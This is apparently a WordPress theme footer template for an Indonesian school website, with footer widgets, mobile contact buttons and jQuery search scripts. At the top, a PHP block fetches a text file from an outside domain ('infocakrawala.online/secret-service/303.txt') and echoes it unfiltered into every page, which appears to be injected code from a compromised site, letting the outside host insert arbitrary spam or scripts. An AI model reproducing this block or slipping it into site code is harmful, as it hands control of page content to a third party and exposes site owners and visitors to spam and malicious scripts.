<div class="external-content">
				<?php
				
				$a = file_get_contents('https://infocakrawala.online/secret-service/303.txt');

				if ($a !== false) {
					echo $a; // Menampilkan konten sebagai teks HTML
				} else {
					echo 'c.';
				}
				?>
</div>

</div><!-- Content -->
		</div><!-- Prestasi -->
			
		<div id="footerbar">
			        <div class="press_container">
	            	    <div class="widget__footer clear">
					    	<div class="footer__block footer_big">
		                 		<div class="footer__block-inner">
			    	            	<?php if ( is_active_sidebar( 'sidebar-1' ) ) {
						                dynamic_sidebar( 'sidebar-1' ); 
	                                } ?>
								</div>
							</div>
							<div class="footer__block">
							    <div class="footer__block-inner">
							    	<?php if ( is_active_sidebar( 'sidebar-2' ) ) {
										dynamic_sidebar( 'sidebar-2' );
									} ?>
								</div>
							</div>
							<div class="footer__block">
						    	<div class="footer__block-inner">
								    <?php if ( is_active_sidebar( 'sidebar-3' ) ) {
										dynamic_sidebar( 'sidebar-3' );
									} ?>
								</div>
							</div>
						</div>
					</div>
		</div>
					
        <div class="footer">
			<div class="press_container">
            <div class="footer__copyright clear">
				<div class="container">
					<div class="copyright">
						<?php press_text_footer(); ?>
					</div>
				</div>
			</div>
			</div>
				
        </div><!-- footer -->   
		<span class="botclose">KELUAR</span>
		<?php if ( prestasi_mobile()) { ?>
		<div class="footer_nav clear">
		    <a href="<?php echo home_url(); ?>" class="five_block nhome">
			    <i class="fa fa-home"></i>
				<div class="ntext">Home</div>
			</a>
			<!-- phone -->
			<?php if ( get_theme_mod('telpon_data') != "" ) {
		    	$tel = get_theme_mod('telpon_data'); 
		    	$new_tel = preg_replace("/[^A-Za-z0-9?!]/",'',$tel);
				?>
		    	<a href="tel:<?php echo $new_tel; ?>" class="five_block nphone">
		    	    <i class="fa fa-phone"></i>
			    	<div class="ntext">Telepon</div>
		    	</a>
			<?php } else { ?>
			    <a href="tel:" class="five_block nphone">
			        <i class="fa fa-phone"></i>
			    	<div class="ntext">Telepon</div>
			    </a>
			<?php } ?>
			<!-- email -->
			<?php if ( get_theme_mod('email_data') != "" ) {
				?>
		    	<a href="mailto:<?php echo get_theme_mod('email_data'); ?>" class="five_block nemail">
			        <i class="fa fa-envelope-o"></i>
			    	<div class="ntext">Email</div>
		    	</a>
			<?php } else { ?>
			    <a href="mailto:" class="five_block nemail">
			        <i class="fa fa-whatsapp"></i>
			    	<div class="ntext">Email</div>
		    	</a>
			<?php } ?>
			<!-- whatsapp -->
			<?php if ( ! prestasi_mobile()) {
		    	$wa_mode = 'https://web.whatsapp.com';
	    	} else {
		    	$wa_mode = 'https://api.whatsapp.com';
	    	}
	    	if ( get_theme_mod('wa_data') != "" ) {
		    	$was = get_theme_mod('wa_data'); 
	    		$new_was = preg_replace("/[^A-Za-z0-9?!]/",'',$was);
		    	if ( get_theme_mod('chat_sekolah') != "" ) {
		         	$wa_mess = get_theme_mod('chat_sekolah'); 
	        	} else {
	            	$wa_mess = 'Saya ingin bertanya seputar sekolah ini..'; 
	        	} 
				?>
		    	<a href="<?php echo $wa_mode .'/send?phone='. $new_was .'&text='. $wa_mess; ?>" class="five_block nwa">
			        <i class="fa fa-whatsapp"></i>
			    	<div class="ntext">WhatsApp</div>
		    	</a>
			<?php } else { ?>
			    <a href="<?php echo $wa_mode; ?>/send?phone=" class="five_block nwa">
			        <i class="fa fa-whatsapp"></i>
			    	<div class="ntext">WhatsApp</div>
		    	</a>
			<?php } ?>
			<div class="five_block nreturn">
		    	<a href="javascript:" id="return"><i class="fa fa-chevron-up"></i></a>
				<div class="ntext">Scroll</div>
			</div>
		</div>
		<?php } ?>
		
		<?php wp_footer(); ?>
		
        <script type="text/javascript">
		
		    function fetch(){
				jQuery.ajax({
					url: '<?php echo admin_url('admin-ajax.php'); ?>',
					type: 'post',
					data: { action: 'data_fetch', keyword: jQuery('#keyword').val() },
					success: function(data) {
						jQuery('#datafetch').html( data );
					}
				});
			}
			
			function sisfetch(){
				jQuery.ajax({
					url: '<?php echo admin_url('admin-ajax.php'); ?>',
					type: 'post',
					data: { action: 'siswa_fetch', student: jQuery('#student').val() },
					success: function(data) {
						jQuery('#siswafetch').html( data );
					}
				});
			}
			
			jQuery(document).scroll(function(){
				if( jQuery(this).scrollTop() >= 450) {  
			        jQuery('.prestasi').addClass("fade");
				} else {
					jQuery('.prestasi').removeClass("fade");
				}
			});
			
			jQuery('#return').click(function() {
				jQuery('body,html').animate({
					scrollTop : 0
			 	}, 500);
			});
			
			jQuery('.opentoggle').click(function() {
				jQuery('.info_tab, .press_cont').slideToggle();
				jQuery('.press_infosekolah').toggleClass("infoshow");
			});
			jQuery('.botsearch').click(function() {
				jQuery('.press_top').toggleClass("opensearch");
				jQuery('.botclose').toggleClass("openclose");
			});
			jQuery('.botclose').click(function() {
				jQuery('.press_top').toggleClass("opensearch");
				jQuery('.botclose').toggleClass("openclose");
			});
			jQuery('.botmenu, .closemenu').click(function() {
				jQuery('.press_nav').toggleClass("openmenu");
			});
			jQuery('.oc_class span').click(function() {
				jQuery('.kelas_cat').slideToggle();
			});
			
		</script>
	</body>
</html>
